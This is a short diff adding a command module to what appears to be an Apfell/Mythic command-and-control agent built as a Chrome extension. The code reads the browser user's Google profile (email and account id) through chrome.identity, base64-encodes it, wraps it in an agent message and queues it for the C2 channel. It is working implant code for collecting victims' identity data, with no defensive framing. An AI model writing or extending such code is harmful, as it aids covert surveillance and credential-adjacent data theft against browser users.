@@ -1,0 +1,17 @@
+userinfo = function() {
+    chrome.identity.getProfileUserInfo(function(info){
+        if (info === undefined) {
+            sendError(taskid, tasktype);
+        } else {
+            const data = btoa(unescape(encodeURIComponent((JSON.stringify(info)))));
+            const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+            let meta = {};
+            meta["metatype"] = 3;
+            meta["metadata"] = apfellMsg;
+            const metaenvelope = JSON.stringify(meta);
+            out.push(metaenvelope);
+        }
+    });
+};
+
+C2.commands[userinfo.name] = userinfo;
